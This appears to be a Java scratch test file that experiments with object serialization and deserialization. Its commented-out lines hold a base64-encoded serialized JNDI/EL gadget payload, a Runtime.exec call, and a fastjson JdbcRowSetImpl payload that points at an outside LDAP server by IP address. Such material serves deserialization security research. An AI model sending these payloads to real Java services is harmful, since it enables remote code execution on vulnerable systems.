package Deunicode;

import javax.jws.soap.SOAPBinding;
import java.io.*;
import java.lang.reflect.Method;
import java.net.Inet4Address;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.HashMap;
import java.util.logging.Logger;

public class test {
//    private static final Logger mylogger = Logger.getLogger("Deunicode.test");

    public static void main(String[] args) throws  Exception {

        User user1 = new User("tailei","12");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.xxx"));
        oos.writeObject(user1);

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.xxx"));
        Object object =ois.readObject();
//        Method[] methods = object.getClass().getDeclaredMethods();
        System.out.println(object);

//        Inet4Address
//        for(Method a : methods){
//            System.out.println(a);
//        }
//        System.out.println(object);

//        mylogger.info("xxxxxx");
//        String var0 = "calc";
//        Runtime.getRuntime().exec(var0);

//        byte[] s = Base64.getDecoder().decode("UaztAAV3DwGrBTqcAAABfevZrlGACXNyACpjb20uc3VuLmpuZGkucm1pLnJlZ2lzdHJ5LlJlZmVyZW5jZVdyYXBwZXJUWg4kl8LF8AIAAUwAB3dyYXBwZWV0ABhMamF2YXgvbmFtaW5nL1JlZmVyZW5jZTt0ACFodHRwOi8vMTI3LjAuMC4xOjgxODAvI0J5cGFzc0J5RUx4cgAjamF2YS5ybWkuc2VydmVyLlVuaWNhc3RSZW1vdGVPYmplY3RFCRIV9eJ+MQIAA0kABHBvcnRMAANjc2Z0AChMamF2YS9ybWkvc2VydmVyL1JNSUNsaWVudFNvY2tldEZhY3Rvcnk7TAADc3NmdAAoTGphdmEvcm1pL3NlcnZlci9STUlTZXJ2ZXJTb2NrZXRGYWN0b3J5O3QAIWh0dHA6Ly8xMjcuMC4wLjE6ODE4MC8jQnlwYXNzQnlFTHhyABxqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlU2VydmVyxxkHEmjzOfsCAAB0ACFodHRwOi8vMTI3LjAuMC4xOjgxODAvI0J5cGFzc0J5RUx4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAdAAhaHR0cDovLzEyNy4wLjAuMTo4MTgwLyNCeXBhc3NCeUVMeHB3EgAQVW5pY2FzdFNlcnZlclJlZngAAAAAcHBzcgAdb3JnLmFwYWNoZS5uYW1pbmcuUmVzb3VyY2VSZWYAAAAAAAAAAQIAAHQAIWh0dHA6Ly8xMjcuMC4wLjE6ODE4MC8jQnlwYXNzQnlFTHhyAB1vcmcuYXBhY2hlLm5hbWluZy5BYnN0cmFjdFJlZgAAAAAAAAABAgAAdAAhaHR0cDovLzEyNy4wLjAuMTo4MTgwLyNCeXBhc3NCeUVMeHIAFmphdmF4Lm5hbWluZy5SZWZlcmVuY2Xoxp6iqOmNCQIABEwABWFkZHJzdAASTGphdmEvdXRpbC9WZWN0b3I7TAAMY2xhc3NGYWN0b3J5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAUY2xhc3NGYWN0b3J5TG9jYXRpb25xAH4AEkwACWNsYXNzTmFtZXEAfgASdAAhaHR0cDovLzEyNy4wLjAuMTo4MTgwLyNCeXBhc3NCeUVMeHBzcgAQamF2YS51dGlsLlZlY3RvctmXfVuAO68BAwADSQARY2FwYWNpdHlJbmNyZW1lbnRJAAxlbGVtZW50Q291bnRbAAtlbGVtZW50RGF0YXQAE1tMamF2YS9sYW5nL09iamVjdDt0ACFodHRwOi8vMTI3LjAuMC4xOjgxODAvI0J5cGFzc0J5RUx4cAAAAAAAAAAFdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHQAIWh0dHA6Ly8xMjcuMC4wLjE6ODE4MC8jQnlwYXNzQnlFTHhwAAAACnNyABpqYXZheC5uYW1pbmcuU3RyaW5nUmVmQWRkcoRL9DzhEdzJAgABTAAIY29udGVudHNxAH4AEnQAIWh0dHA6Ly8xMjcuMC4wLjE6ODE4MC8jQnlwYXNzQnlFTHhyABRqYXZheC5uYW1pbmcuUmVmQWRkcuugB5oCOK9KAgABTAAIYWRkclR5cGVxAH4AEnQAIWh0dHA6Ly8xMjcuMC4wLjE6ODE4MC8jQnlwYXNzQnlFTHhwdAAFc2NvcGV0AABzcQB+ABx0AARhdXRocQB+ACJzcQB+ABx0AAlzaW5nbGV0b250AAR0cnVlc3EAfgAcdAALZm9yY2VTdHJpbmd0AAZ4PWV2YWxzcQB+ABx0AAF4dACZIiIuZ2V0Q2xhc3MoKS5mb3JOYW1lKCJqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlciIpLm5ld0luc3RhbmNlKCkuZ2V0RW5naW5lQnk=");
//        for(int i=0;i<s.length-1;i++){
//            s[i]=s[i+1];
//        }
//        String a =new String(s);
//        System.out.println(s);
//        FileOutputStream fos = new FileOutputStream(new File("hello"));
//        fos.write(s);
//
//        ObjectInputStream ois  = new ObjectInputStream(new FileInputStream("hello"));
//        Object o = ois.readObject();
//        System.out.println(o.toString());
//        System.out.println(new String(s);
//        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("forserialize.txt"));

//        System.out.println(Thread.currentThread().getContextClassLoader());
//          System.out.println(URLEncoder.encode("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://121.196.109.163:1389/jgpdpn\",\"autoCommit\":true}","utf-8"));
//        System.out.println(URLEncoder.encode("{\"@type\": \"java.lang.AutoCloseable\"}","utf-8"));
//        HashMap
    }
}
